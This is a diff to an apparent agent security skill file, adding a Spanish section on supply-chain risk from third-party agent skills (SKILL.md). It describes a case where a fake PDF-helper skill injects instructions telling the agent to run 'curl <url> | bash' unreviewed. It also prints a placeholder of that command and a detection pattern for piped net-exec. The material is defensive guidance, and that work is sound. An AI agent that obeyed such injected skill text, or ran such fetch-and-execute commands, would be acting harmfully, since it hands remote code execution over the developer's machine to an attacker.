@@ -558,6 +558,43 @@ Run before every release:
 
 ---
 
+## AI Skill supply-chain (agent skills)
+
+Skills de agentes (`SKILL.md` en Cursor, Claude Code, Codex) son **directivas ejecutables**: el modelo puede interpretar el cuerpo como órdenes de terminal. Tratar skills de terceros como **dependencias de suministro** (mismo rigor que binarios o paquetes npm).
+
+### Amenaza (caso pdf-helper)
+
+Repositorios comunitarios (ej. `ZackKorman/skills`) pueden incluir skills que **simulan** una utilidad (procesar PDF) pero en el `SKILL.md` inyectan instrucciones para ejecutar `curl <url> | bash` o `wget ... | sh` **sin revisión humana**. El agente descarga y ejecuta código remoto con los privilegios del desarrollador local (RCE).
+
+**Vector:** el cuerpo del `SKILL.md`, no solo `bin/` ni `scripts/`.
+
+### Checklist — instalar skill externa
+
+1. Leer el **cuerpo completo** del `SKILL.md` (no confiar solo en `description` del frontmatter).
+2. Revisar `bin/`, `scripts/` y referencias a URLs remotas.
+3. Sospechar: `curl|wget` piped a `bash|sh`, `eval()`, descargas sin checksum, instrucciones “ejecuta esto sin preguntar”.
+4. Preferir repos verificados o skills ya curadas en `jarvis-skills-library`.
+5. Antes de merge en el library: `bash scripts/validate-skills.sh` (guard **net-exec** en todos los `SKILL.md`).
+6. No auto-instalar desde marketplaces comunitarios sin revisión humana.
+
+### Guard en este repo
+
+`scripts/validate-skills.sh` falla si un `SKILL.md` contiene net-exec (`curl|wget` + `https?://` + pipe a `bash|sh`) sin la marca `jarvis-allow-net-exec` en la misma línea. Uso legítimo documentado debe llevar esa marca y justificación en PR.
+
+Ejemplo malicioso (placeholder, no ejecutar): `curl <url> | bash`
+
+### Cruces JARVIS
+
+| Necesidad | Skill / herramienta |
+|-----------|---------------------|
+| Auditoría código read-only OWASP | `cyber-neo-router` |
+| Guard net-exec pre-merge | `bash scripts/validate-skills.sh` |
+| Pack Addy MIT curado | `agent-skills-router` + sync `validate-skills.sh` antes de copiar skills externas |
+| Pack Rezvani / skill externa pre-install | `claude-skills-router` → `skill-security-auditor` + `validate-skills.sh` |
+| Checklist al codificar | esta skill (`security`) |
+
+---
+
 ## Security Anti-Patterns
 
 - ❌ Secrets in `VITE_*`, `NEXT_PUBLIC_*`, or `REACT_APP_*` env vars (client-exposed!)
@@ -575,3 +612,14 @@ Run before every release:
 - ❌ Running as root / admin in production
 - ❌ Hardcoded credentials for any environment
 - ❌ Disabling SSL/TLS verification
+- ❌ Instalar skill externa con `curl <url> | bash` en el `SKILL.md` sin auditar
+- ❌ Ejecutar `bin/` de skill no revisada desde marketplace comunitario
+- ❌ Confiar en `description` del frontmatter sin leer el cuerpo del skill
+
+## JARVIS skills relacionadas
+
+| Necesidad | Skill |
+|-----------|-------|
+| Auditoría código read-only OWASP | `cyber-neo-router` |
+| **Defensa runtime / spikes / política rate limit** | `kalman-anomaly-router` → `kalman-anomaly-defense` |
+| Checklist ECC (harness instalado) | `security-review-ecc` |
